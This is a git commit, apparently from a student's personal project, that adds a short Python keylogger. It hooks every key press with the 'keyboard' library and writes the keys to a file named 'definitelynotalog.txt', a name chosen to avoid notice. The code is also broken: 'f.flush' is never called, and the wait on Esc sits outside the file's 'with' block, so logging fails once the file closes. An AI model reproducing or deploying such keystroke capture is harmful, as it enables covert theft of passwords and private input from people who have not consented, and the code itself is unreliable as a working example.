bc82887f7a3553da5668b4cf3fa8ce1556a2ca90
Amraj Randhawa <randha13@my.yorku.ca>
2024-12-21 23:56:47 -0500

    completed simple keylogger, bugfixing now.

--- simple-keylogger.py
+++ simple-keylogger.py
@@ -1,1 +1,19 @@
+import keyboard
+
+
+
+#this will record all key press downs. 
+with open("definitelynotalog.txt", "w") as f:
+    def key_event(event):
+        if event.event_type == 'down':
+            f.write((f"Key: {event.name}"))
+            f.flush # write immediately
+
+
+#hook monitors all keyboard events.
+    keyboard.hook(key_event)
+    
+#cancels when 'esc' is pressed.
+keyboard.wait('esc')
+
 
